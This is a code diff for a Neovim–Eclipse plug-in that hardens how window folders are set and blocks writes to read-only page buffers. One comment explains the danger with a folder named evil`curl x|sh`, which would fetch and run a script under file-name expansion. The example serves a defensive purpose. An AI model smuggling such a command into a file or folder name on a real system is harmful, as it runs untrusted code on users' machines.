@@ -1121,7 +1121,8 @@ final class LuaScripts {
      * would take it. With autocommands: entering a window is what the user's config and Neovim
      * expect to hear about, as for any window. Returns the window's id, or -1 for a window that no
      * longer exists (nothing entered). The folder is set with {@code chdir()}, never a command
-     * line: a folder's name is not expanded (see {@link #WINDOWS}, {@code open}).
+     * line, and where it landed is checked ({@link #WINDOWS}, {@code set_folder}): {@code chdir()}
+     * runs nothing in a name but expands {@code $VAR}.
      */
     static final String FOCUS_WINDOW = """
             local win, from = tonumber((select(1, ...))), tonumber((select(2, ...)))
@@ -1131,17 +1132,12 @@ final class LuaScripts {
             if from and from > 0 and vim.api.nvim_win_is_valid(from) and not vim.o.autochdir then
               -- Read by window and tabpage number: getcwd() with only the window id of another
               -- tabpage finds no window, and getcwd() inside nvim_win_call() on one answers with
-              -- another window's folder (probed on 0.12.6). chdir() inside nvim_win_call() does
-              -- set the right window's.
-              local function folder_of(w)
-                local at = vim.fn.win_id2tabwin(w)
-                return vim.fn.getcwd(at[2], at[1])
-              end
-              local folder = folder_of(from)
-              if folder ~= '' and folder ~= folder_of(win) then
-                vim.api.nvim_win_call(win, function()
-                  pcall(vim.fn.chdir, folder, 'window')
-                end)
+              -- another window's folder (probed on 0.12.6).
+              local at = vim.fn.win_id2tabwin(from)
+              local folder = vim.fn.getcwd(at[2], at[1])
+              local windows = package.loaded['neovim4eclipse.windows']
+              if folder ~= '' and windows then
+                windows.set_folder(win, folder) -- where chdir() lands is checked there
               end
             end
             vim.api.nvim_set_current_win(win)
@@ -1303,6 +1299,38 @@ final class LuaScripts {
               end
             end
 
+            --- A window's folder, read by window and tabpage number: getcwd() inside nvim_win_call()
+            --- on a window of another tabpage answers with another window's folder (0.12.6).
+            local function folder_of(win)
+              local at = vim.fn.win_id2tabwin(win)
+              return vim.fn.getcwd(at[2], at[1])
+            end
+
+            --- Gives win the folder of its own (chdir(..., 'window'), never :lcd), and checks where
+            --- it landed, by the one path rule (PATHS). chdir() expands no backticks, wildcards or
+            --- ~, so nothing in a folder's name runs, but it does expand environment variables: a
+            --- folder named e$SHELL lands in e/bin/zsh (probed on 0.12.6). Where it landed, not the
+            --- route there, is checked: a folder it did not land in is undone, and win keeps the
+            --- folder it had. Returns whether win now works in folder. Silent, as chdir() is.
+            function M.set_folder(win, folder)
+              local paths = package.loaded['neovim4eclipse.paths']
+              local same = paths and paths.same or function(a, b) return a == b end
+              local before = folder_of(win)
+              if same(before, folder) then
+                return true -- there already: no chdir(), so no DirChanged for nothing
+              end
+              vim.api.nvim_win_call(win, function()
+                pcall(vim.fn.chdir, folder, 'window')
+              end)
+              if same(folder_of(win), folder) then
+                return true
+              end
+              vim.api.nvim_win_call(win, function()
+                pcall(vim.fn.chdir, before, 'window')
+              end)
+              return false
+            end
+
             function M.open(buf, folder)
               if not vim.api.nvim_buf_is_valid(buf) then
                 return -2 -- wiped in Neovim (:noautocmd bwipeout): Eclipse makes the buffer anew
@@ -1325,12 +1353,12 @@ final class LuaScripts {
                 -- the :w that just opened another editor, say).
                 -- chdir(), not :lcd: a command's argument goes through file-name expansion, where
                 -- `...` runs a shell command, so a project folder named evil`curl x|sh` would run it
-                -- the moment one of its files opened. chdir() takes the name
-                -- as it is, and says nothing.
-                if folder ~= nil and folder ~= '' and not vim.o.autochdir and vim.fn.isdirectory(folder) == 1 then
-                  pcall(vim.fn.chdir, folder, 'window')
-                end
+                -- the moment one of its files opened. chdir() runs nothing and says nothing, but it
+                -- expands $VAR, so M.set_folder checks where it landed.
               end)
+              if folder ~= nil and folder ~= '' and not vim.o.autochdir and vim.fn.isdirectory(folder) == 1 then
+                M.set_folder(win, folder)
+              end
               return win
             end
 
@@ -2162,8 +2190,8 @@ final class LuaScripts {
      * <p>The buffer is a scratch one that no file has ({@code buftype=nofile}, unlisted, no swap
      * file, kept when hidden), named {@code neovim4eclipse://<name>} so that {@code :ls!} and the
      * status line say what it is, and changeable only while its text is set ({@code nomodifiable}
-     * again at the end), so a page can never be typed into or written: {@code :w} there gets Neovim's
-     * own E382. Made and filled quietly: no {@code BufNew}, {@code BufFilePost} or {@code TextChanged}
+     * again at the end), so a page can never be typed into or written: every write, {@code :w x},
+     * {@code :1w x} and {@code :w >> x} too, gets Vim's E382 from the page's own write hooks. Made and filled quietly: no {@code BufNew}, {@code BufFilePost} or {@code TextChanged}
      * for the user's config or the plug-in's own buffer hooks, which are about files. {@code q} in it
      * closes the page editor ({@code :Eclipse quit}, which names the page's window as its origin);
      * a {@code q} the user mapped for the buffer is kept. The colors are the user's: this is their
@@ -2188,6 +2216,18 @@ final class LuaScripts {
                 buf = vim.api.nvim_create_buf(false, true)
                 pcall(vim.api.nvim_buf_set_name, buf, full)
                 vim.b[buf].neovim4eclipse_page = name
+                -- Never written: 'nofile' refuses a plain :w (E382), but Vim writes such a buffer
+                -- under a name (:w x, :1w x, :w >> x, :w! x), straight to disk, behind Eclipse.
+                -- Every way of writing a buffer runs one of these, so each refuses, with Vim's own
+                -- error, and writes nothing. Yanking the text into an editor still works.
+                for _, event in ipairs({ 'BufWriteCmd', 'FileWriteCmd', 'FileAppendCmd' }) do
+                  vim.api.nvim_create_autocmd(event, {
+                    buffer = buf,
+                    callback = function()
+                      error("E382: Cannot write, 'buftype' option is set", 0)
+                    end,
+                  })
+                end
               end
               local bo = vim.bo[buf]
               bo.buftype, bo.bufhidden, bo.swapfile, bo.buflisted = 'nofile', 'hide', false, false
